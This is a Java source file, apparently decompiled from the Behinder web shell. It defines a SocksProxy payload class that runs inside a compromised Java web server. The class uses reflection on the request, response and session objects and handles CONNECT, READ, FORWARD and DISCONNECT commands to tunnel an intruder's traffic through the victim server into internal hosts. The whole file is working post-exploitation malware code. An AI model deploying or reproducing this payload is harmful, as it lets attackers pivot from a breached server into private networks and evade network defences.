package net.rebeyond.behinder.payload.java;

import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import java.util.Map;
import org.objectweb.asm.Opcodes;

public class SocksProxy {
    public static String cmd;
    public static String extraData;
    public static String socketHash;
    public static String targetIP;
    public static String targetPort;
    private Object Request;
    private Object Response;
    private Object Session;

    public boolean equals(Object obj) {
        try {
            fillContext(obj);
            proxy();
            return true;
        } catch (Exception e) {
            return true;
        }
    }

    public void proxy() throws Exception {
        Object obj = this.Request;
        Object response = this.Response;
        Object session = this.Session;
        if (cmd == null) {
            return;
        }
        if (cmd.compareTo("CONNECT") == 0) {
            try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                sessionSetAttribute(session, "socket_" + socketHash, socketChannel);
                response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
            } catch (Exception e) {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new byte[]{55, 33, 73, 54});
                write.invoke(so, e.getMessage().getBytes());
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            }
        } else if (cmd.compareTo("DISCONNECT") == 0) {
            try {
                ((SocketChannel) sessionGetAttribute(session, "socket_" + socketHash)).socket().close();
            } catch (Exception e2) {
            }
            sessionRemoveAttribute(session, "socket_" + socketHash);
        } else if (cmd.compareTo("READ") == 0) {
            SocketChannel socketChannel2 = (SocketChannel) sessionGetAttribute(session, "socket_" + socketHash);
            try {
                ByteBuffer buf = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write2 = so2.getClass().getMethod("write", byte[].class, Integer.TYPE, Integer.TYPE);
                for (int bytesRead = socketChannel2.read(buf); bytesRead > 0; bytesRead = socketChannel2.read(buf)) {
                    write2.invoke(so2, buf.array(), 0, Integer.valueOf(bytesRead));
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    buf.clear();
                }
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
            } catch (Exception e3) {
                response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write3 = so3.getClass().getMethod("write", byte[].class);
                write3.invoke(so3, new byte[]{55, 33, 73, 54});
                write3.invoke(so3, e3.getMessage().getBytes());
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                socketChannel2.socket().close();
            } catch (Error e4) {
            }
        } else if (cmd.compareTo("FORWARD") == 0) {
            SocketChannel socketChannel3 = (SocketChannel) sessionGetAttribute(session, "socket_" + socketHash);
            try {
                byte[] extraDataByte = base64decode(extraData);
                ByteBuffer buf2 = ByteBuffer.allocate(extraDataByte.length);
                buf2.clear();
                buf2.put(extraDataByte);
                buf2.flip();
                while (buf2.hasRemaining()) {
                    socketChannel3.write(buf2);
                }
            } catch (Exception e5) {
                Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write4 = so4.getClass().getMethod("write", byte[].class);
                write4.invoke(so4, new byte[]{55, 33, 73, 54});
                write4.invoke(so4, e5.getMessage().getBytes());
                so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
                socketChannel3.socket().close();
            }
        }
    }

    private byte[] base64decode(String text) throws Exception {
        try {
            if (System.getProperty("java.version").compareTo("1.9") >= 0) {
                getClass();
                Class Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
                return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
            }
            getClass();
            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, text);
        } catch (Exception e) {
            return null;
        }
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private Object sessionGetAttribute(Object session, String key) {
        try {
            return session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }

    private Enumeration sessionGetAttributeNames(Object session) {
        try {
            return (Enumeration) session.getClass().getMethod("getAttributeNames", new Class[0]).invoke(session, new Object[0]);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionRemoveAttribute(Object session, String key) {
        try {
            session.getClass().getMethod("removeAttribute", new Class[0]).invoke(session, key);
        } catch (Exception e) {
        }
    }
}
